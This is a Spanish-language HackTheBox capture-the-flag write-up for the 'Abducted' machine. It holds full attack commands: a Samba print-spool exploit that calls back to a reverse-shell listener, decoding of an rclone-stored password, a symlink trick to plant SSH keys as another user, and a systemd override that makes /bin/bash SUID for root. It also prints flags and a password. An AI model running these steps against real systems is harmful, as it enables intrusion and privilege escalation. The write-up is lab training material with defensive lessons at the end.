Abducted — Intrusión Completa
#

Dificultad: Medium Plataforma: HackTheBox Flags: 081e59d9eae7ad3ddb4e329444ebb1e0 (user) / 7872313c5857fade41ada24fe91c18e4 (root)

Reconocimiento
#

Comenzamos verificando conectividad con la máquina:

❯ ping -c1 10.129.244.177
PING 10.129.244.177 (10.129.244.177) 56(84) bytes of data.
64 bytes from 10.129.244.177: icmp_seq=1 ttl=63 time=85.9 ms

TTL de 63 — Linux. Escaneamos todos los puertos:

❯ nmap -p- --open -sS --min-rate 5000 10.129.244.177 -n -Pn -oG nmap/allPorts -v

PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Solo tres puertos abiertos: SSH (22), NetBIOS (139) y SMB (445). Ningún servicio web. Profundizamos en los servicios:

❯ nmap -p22,139,445 -sCV 10.129.244.177 -n -Pn -oN nmap/targeted

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Agregamos el host a /etc/hosts:

❯ echo -e "10.129.244.177\t\tabducted.htb" | sudo tee -a /etc/hosts

#

Probamos acceso con sesión nula para listar los shares:

❯ nxc smb abducted.htb -u "" -p "" --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\:
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service

El share HP-Reception es interesante: permite escritura y parece estar relacionado con una impresora. Esto nos lleva a investigar vulnerabilidades en Samba relacionadas con el spool de impresión.

Explotación
#

CVE-2026-4480 — Samba Print Spool Command Injection
#

Encontramos un PoC para CVE-2026-4480 que explota el print spool de Samba para ejecutar comandos:

El share HP-Reception es writable y está configurado como printer en smb.conf:

❯ python CVE-2026-4480-PoC/exploit.py -P HP-Reception 10.129.244.177 10.10.16.29 4445
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.16.29:4445  (start a listener first: nc -lvnp 4445)
[+] print job submitted -- check your listener / out-of-band channel

Obtenemos una reverse shell como nobody:

nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

Enumeración como nobody
#

Explorando el sistema encontramos un backup script con credenciales ofuscadas mediante rclone:

nobody@abducted:/opt/offsite-backup$ cat *
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects

Desciframos la contraseña con rclone reveal:

nobody@abducted:/var/spool/samba$ rclone reveal "HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw" 2>/dev/null
iXzvcib3SrpZ

Escalada de Privilegios
#

Análisis de la configuración Samba
#

Revisamos la configuración de Samba para entender los shares y sus permisos:

scott@abducted:~$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes

Dos detalles críticos:

  1. wide links = yes en el share transfer — permite seguir symlinks
  2. force user = marcus — los archivos se escriben como el usuario marcus

Esto permite un ataque de symlink para escribir la clave pública de Scott en el .ssh de Marcus.

Pivot a Marcus mediante symlink
#

Creamos un symlink en /srv/transfer que apunte al home de Marcus:

scott@abducted:~$ ln -sf /home/marcus/ /srv/transfer/marcus_home

Generamos un par de llaves SSH y subimos authorized_keys a través del share:

scott@abducted:~$ ssh-keygen -t rsa -N ""
scott@abducted:~$ cat ~/.ssh/id_rsa.pub > authorized_keys
scott@abducted:~$ chmod 600 authorized_keys
scott@abducted:~$ smbclient //127.0.0.1/transfer/ -U scott%iXzvcib3SrpZ
smb: \> cd marcus_home
smb: \marcus_home\> mkdir .ssh
smb: \marcus_home\.ssh\> put authorized_keys

Nos conectamos como Marcus:

scott@abducted:~$ ssh marcus@localhost
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)

Abuso de grupo operators — systemd override
#

Marcus pertenece al grupo operators. Buscamos archivos accesibles por este grupo:

marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d

El directorio /etc/systemd/system/smbd.service.d/ es writeable por el grupo operators. Esto permite crear un override de systemd que ejecute comandos como root cuando el servicio smbd se reinicie.

Creamos un override que otorga SUID a /bin/bash:

marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/bin/bash -c 'chmod u+s /bin/bash'
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd

A pesar del error aparente, el SUID se aplica:

marcus@abducted:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
marcus@abducted:~$ bash -p
bash-5.2# cat /root/root.txt
7872313c5857fade41ada24fe91c18e4

Root conseguido.

Lecciones aprendidas
#

  1. No usar wide links = yes en shares Samba. Permite que un atacante cree symlinks a cualquier directorio del sistema y acceda a archivos de otros usuarios.
  2. force user en Samba redirige la escritura a otro usuario. Combinado con symlinks, un atacante puede escribir archivos de configuración o claves SSH de otros usuarios.
  3. Proteger directorios de systemd. El grupo operators no debería tener permisos de escritura en /etc/systemd/system/. Un override malicioso puede ejecutar código como root.
  4. Las contraseñas ofuscadas con rclone no son seguras. rclone reveal las descifra trivialmente.
  5. Sesiones nulas en Samba siguen siendo un vector de información valioso. El share HP-Reception expuso la superficie de ataque inicial.
